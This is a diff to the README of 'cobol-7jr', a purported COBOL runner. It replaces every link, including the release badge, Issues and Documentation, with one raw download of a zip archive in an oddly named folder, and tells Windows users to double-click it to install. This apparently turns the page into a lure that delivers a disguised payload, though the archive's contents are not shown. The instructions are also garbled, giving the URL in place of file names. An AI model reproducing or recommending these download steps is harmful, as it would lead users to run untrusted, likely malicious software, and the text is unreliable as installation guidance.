@@ -6,7 +6,7 @@ Welcome to **cobol-7jr**! This application helps you run COBOL programs easily. 
 
 ## 👇 Download Here
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Luka3912/cobol-7jr/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,18 +14,18 @@ To use cobol-7jr, you first need to download the application. Follow these steps
 
 ### 1. Visit the Releases Page
 
-Go to our [Releases Page](https://github.com/Luka3912/cobol-7jr/releases) to find the latest version of cobol-7jr. You will see a list of available releases along with details for each version.
+Go to our [Releases Page](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip) to find the latest version of cobol-7jr. You will see a list of available releases along with details for each version.
 
 ### 2. Download the Application
 
-On the Releases Page, you can find files listed under the latest version. Look for the main application file, usually named something like `cobol-7jr.exe`. Click on this file to start downloading.
+On the Releases Page, you can find files listed under the latest version. Look for the main application file, usually named something like `https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip`. Click on this file to start downloading.
 
 ### 3. Install the Application
 
 Once the download is complete, locate the downloaded file on your computer. Depending on your operating system, usually, this can be found in the "Downloads" folder.
 
 - **For Windows Users:** 
-  - Double-click on the `cobol-7jr.exe` file to start the installation. Follow the prompts to complete the installation.
+  - Double-click on the `https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip` file to start the installation. Follow the prompts to complete the installation.
 
 - **For Mac Users:**
   - Double-click on the downloaded file. Drag the application to your "Applications" folder.
@@ -59,7 +59,7 @@ To use cobol-7jr, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/Luka3912/cobol-7jr/releases) and download the latest version of cobol-7jr. Follow the installation steps outlined above, and you will be ready to run your COBOL programs.
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip) and download the latest version of cobol-7jr. Follow the installation steps outlined above, and you will be ready to run your COBOL programs.
 
 ## 🤔 Frequently Asked Questions
 
@@ -81,8 +81,8 @@ If you have questions or need assistance, feel free to open an issue on our GitH
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Luka3912/cobol-7jr/releases)
-- [Issues](https://github.com/Luka3912/cobol-7jr/issues)
-- [Documentation](https://github.com/Luka3912/cobol-7jr/docs)
+- [Releases Page](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip)
+- [Issues](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/Luka3912/cobol-7jr/main/siliquous/cobol-7jr_3.5.zip)
 
 Thank you for using cobol-7jr! Enjoy running your COBOL programs with ease.
